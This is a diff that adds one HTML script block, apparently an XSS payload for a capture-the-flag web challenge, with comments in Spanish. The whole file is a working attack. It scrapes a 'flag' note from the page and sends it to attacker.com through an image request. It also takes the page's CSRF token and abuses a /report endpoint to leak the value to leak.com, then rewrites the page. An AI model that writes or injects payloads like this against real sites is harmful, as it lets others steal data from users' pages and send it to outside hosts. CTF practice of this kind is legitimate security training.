@@ -1,0 +1,51 @@
+<script>
+// Esperar a que el DOM esté listo
+setTimeout(function() {
+    // Buscar la nota con la flag
+    var headers = document.getElementsByTagName('h2');
+    var flagContent = '';
+    
+    for (var i = 0; i < headers.length; i++) {
+        if (headers[i].innerText === 'flag' || headers[i].innerText.toLowerCase().includes('flag')) {
+            // Obtener el contenido de la flag
+            var nextElement = headers[i].nextElementSibling;
+            if (nextElement && nextElement.tagName === 'P') {
+                flagContent = nextElement.innerText;
+                break;
+            }
+        }
+    }
+    
+    // Si encontramos la flag, intentar exfiltrarla
+    if (flagContent) {
+        // Opción 1: Intentar navegar a una URL con la flag
+        // Esto podría funcionar si podemos ver los logs del servidor
+        try {
+            var img = new Image();
+            img.src = 'http://attacker.com/?flag=' + encodeURIComponent(flagContent);
+        } catch(e) {}
+        
+        // Opción 2: Intentar usar la función de report para enviar la flag
+        // Primero obtener el token CSRF
+        var csrfToken = '';
+        var inputs = document.getElementsByName('_csrf');
+        if (inputs.length > 0) {
+            csrfToken = inputs[0].value;
+        }
+        
+        // Hacer una petición para reportar una URL que contenga la flag
+        if (csrfToken) {
+            fetch('/report', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: '_csrf=' + csrfToken + '&url=' + encodeURIComponent('http://leak.com/?flag=' + flagContent)
+            });
+        }
+        
+        // Opción 3: Cambiar el DOM para mostrar la flag de manera visible
+        document.body.innerHTML = '<h1>FLAG: ' + flagContent + '</h1>';
+    }
+}, 1000);
+</script>
